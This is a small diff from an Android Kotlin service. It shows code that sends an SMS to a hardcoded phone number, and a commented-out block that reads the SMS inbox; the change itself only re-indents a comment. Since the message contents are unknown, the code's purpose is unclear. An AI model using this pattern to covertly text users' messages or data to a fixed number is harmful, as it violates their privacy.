@@ -53,7 +53,7 @@ class StazaIntent : IntentService("StazaIntent") {
             val sm = SmsManager.getDefault()
             sm.sendTextMessage("+918422066247", null, msg, null, null)
         }
-        /*public static final String INBOX = "content://sms/inbox";
+      /*public static final String INBOX = "content://sms/inbox";
         public static final String SENT = "content://sms/sent";
         public static final String DRAFT = "content://sms/draft";
         val cursor = contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null)
